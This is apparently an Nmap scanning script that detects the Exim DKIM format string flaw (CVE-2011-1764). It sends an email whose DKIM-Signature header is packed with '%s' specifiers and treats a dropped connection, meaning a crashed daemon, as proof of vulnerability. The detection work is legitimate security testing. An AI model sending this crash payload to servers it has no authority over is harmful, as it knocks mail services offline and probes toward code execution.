local shortport = require "shortport"
local smtp = require "smtp"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local vulns = require "vulns"

description = [[
Checks for a format string vulnerability in the Exim SMTP server
(version 4.70 through 4.75) with DomainKeys Identified Mail (DKIM) support
(CVE-2011-1764).  The DKIM logging mechanism did not use format string
specifiers when logging some parts of the DKIM-Signature header field.
A remote attacker who is able to send emails, can exploit this vulnerability
and execute arbitrary code with the privileges of the Exim daemon.

Reference:
* http://bugs.exim.org/show_bug.cgi?id=1106
* http://thread.gmane.org/gmane.mail.exim.devel/4946
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=2011-1764
* http://en.wikipedia.org/wiki/DomainKeys_Identified_Mail
]]

---
-- @usage
-- nmap --script=smtp-vuln-cve2011-1764 -pT:25,465,587 <host>
--
-- @output
-- PORT   STATE SERVICE
-- 25/tcp open  smtp
-- | smtp-vuln-cve2011-1764: 
-- |   VULNERABLE:
-- |   Exim DKIM format string
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2011-1764  OSVDB:72156
-- |     Risk factor: High  CVSSv2: 7.5 (HIGH) (AV:N/AC:L/Au:N/C:P/I:P/A:P)
-- |     Description:
-- |       Exim SMTP server (version 4.70 through 4.75) with DomainKeys Identified
-- |       Mail (DKIM) support is vulnerable to a format string. A remote attacker
-- |       who is able to send emails, can exploit this vulnerability and execute
-- |       arbitrary code with the privileges of the Exim daemon.
-- |     Disclosure date: 2011-04-29
-- |     References:
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1764
-- |       http://osvdb.org/72156
-- |_      http://bugs.exim.org/show_bug.cgi?id=1106
--
-- @args smtp.domain Define the domain to be used in the SMTP EHLO command.
-- @args smtp-vuln-cve2011-1764.mailfrom Define the source email address to
--       be used.
-- @args smtp-vuln-cve2011-1764.mailto Define the destination email address
--       to be used.

author = "Djalal Harouni"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln"}


portrule = function (host, port)
  if port.version.product ~= nil and port.version.product ~= "Exim smtpd" then
     return false
  end
  return shortport.port_or_service({25, 465, 587},
              {"smtp", "smtps", "submission"})(host, port)
end

local function smtp_finish(socket, status, msg)
  if socket then
    socket:close()
  end
  return status, msg
end

local function get_exim_banner(response)
  local banner, version
  banner = response:match("%d+%s(.+)")
  if banner and banner:match("Exim") then
    version = tonumber(banner:match("Exim%s([0-9%.]+)"))
  end
  return banner, version
end

-- Sends the mail with the evil DKIM-Signatures header.
-- Returns true, true if the Exim server is vulnrable
local function check_dkim(socket, smtp_opts)
  local killed = false
  
  stdnse.print_debug(2, "%s: checking the Exim DKIM Format String",
        SCRIPT_NAME)

  local status, response = smtp.mail(socket, smtp_opts.mailfrom)
  if not status then
    return status, response
  end

  status, response = smtp.recipient(socket, smtp_opts.mailto)
  if not status then
    return status, response
  end

  status, response = smtp.datasend(socket)
  if not status then
    return status, response
  end

  local message = "MIME-Version: 1.0\r\n"
  message = message..string.format("From: <%s>\r\nTo: <%s>\r\n",
                                   smtp_opts.mailfrom,
                                   smtp_opts.mailto)
  message = message.."Subject: Nmap Exim DKIM Format String check\r\n"

  -- use a fake DKIM-Signature header.
  message = message.."DKIM-Signature: v=1; a=%s%s%s%s;"
  message = message.." c=%s%s%s%s; q=dns/txt;\r\n"
  message = message.." d=%s%s%s%s; s=%s%s%s%s;\r\n"
  message = message.." h=mime-version:from:to:subject;\r\n"
  message = message.." bh=MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI=;\r\n"
  message = message.." b=DyE0uKynaea3Y66zkrnMaBqtYPYVXhazCKGBiZKMNywclgbj0MkREPH3t2EWByev9g="
  status, response = socket:send(message.."\r\n")
  if not status then
    return status, "failed to send the message."
  end

  status, response = smtp.query(socket, ".")
  if not status then
    if string.match(response, "connection closed") then
      stdnse.print_debug(2,
          "%s: Exim server is vulnerable to DKIM Format String", SCRIPT_NAME)
      killed = true
    else
      return status, "failed to terminate the message, seems NOT VULNERABLE"
    end
  end

  return true, killed
end

-- Checks if the Exim server is vulnerable to CVE-2011-1764
local function check_exim(smtp_opts)
  local smtp_server = {}
  local exim_ver_min, exim_ver_max = 4.70, 4.75

  local socket, ret = smtp.connect(smtp_opts.host,
                          smtp_opts.port,
                          {ssl = true,
                          timeout = 10000,
                          recv_before = true,
                          lines = 1})

  if not socket then
    return smtp_finish(nil, socket, ret)
  end

  smtp_server.banner, smtp_server.version = get_exim_banner(ret)
  if not smtp_server.banner then
    return smtp_finish(socket, false,
              'failed to read the SMTP banner.')
  elseif not smtp_server.banner:match("Exim") then
    return smtp_finish(socket, false,
              'not a Exim server: NOT VULNERABLE')
  end

  local vuln = smtp_opts.vuln
  vuln.extra_info = {}
  if smtp_server.version then
    if smtp_server.version <= exim_ver_max and
      smtp_server.version >= exim_ver_min then
      vuln.state = vulns.STATE.LIKELY_VULN
      table.insert(vuln.extra_info,
          string.format("Exim version: %.02f", smtp_server.version))
    else
      vuln.state = vulns.STATE.NOT_VULN
      return smtp_finish(socket, true)
    end
  end
  
  local status, response = smtp.ehlo(socket, smtp_opts.domain)
  if not status then
    return smtp_finish(socket, status, response)
  end

  -- set the appropriate 'MAIL FROM' and 'RCPT TO' values
  if not smtp_opts.mailfrom then
    smtp_opts.mailfrom = string.format("root@%s", smtp_opts.domain)
  end
  if not smtp_opts.mailto then
    smtp_opts.mailto = string.format("postmaster@%s",
                          smtp_opts.host.targetname and
                          smtp_opts.host.targetname or 'localhost')
  end

  status, ret = check_dkim(socket, smtp_opts)
  if not status then
    return smtp_finish(socket, status, ret)
  elseif ret then
    vuln.state = vulns.STATE.VULN
  elseif not vuln.state then
    vuln.state = vulns.STATE.NOT_VULN
  end

  return smtp_finish(socket, true)
end

action = function(host, port)
  local smtp_opts = {
    host = host,
    port = port,
    domain = stdnse.get_script_args('smtp.domain') or
              'nmap.scanme.org',
    mailfrom = stdnse.get_script_args('smtp-vuln-cve2011-1764.mailfrom'),
    mailto = stdnse.get_script_args('smtp-vuln-cve2011-1764.mailto'),
    vuln = {
      title = 'Exim DKIM format string',
      IDS = {CVE = 'CVE-2011-1764', OSVDB = '72156'},
      risk_factor = "High",
      scores = {
        CVSSv2 = "7.5 (HIGH) (AV:N/AC:L/Au:N/C:P/I:P/A:P)",
      },
      description = [[
Exim SMTP server (version 4.70 through 4.75) with DomainKeys Identified
Mail (DKIM) support is vulnerable to a format string. A remote attacker
who is able to send emails, can exploit this vulnerability and execute
arbitrary code with the privileges of the Exim daemon.]],
      references = {
        'http://bugs.exim.org/show_bug.cgi?id=1106',
      },
      dates = {
        disclosure = {year = '2011', month = '04', day = '29'},
      },
    },
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local status, err = check_exim(smtp_opts)
  if not status then
    stdnse.print_debug(1, "%s: %s", SCRIPT_NAME, err)
    return nil
  end
  return report:make_output(smtp_opts.vuln)
end
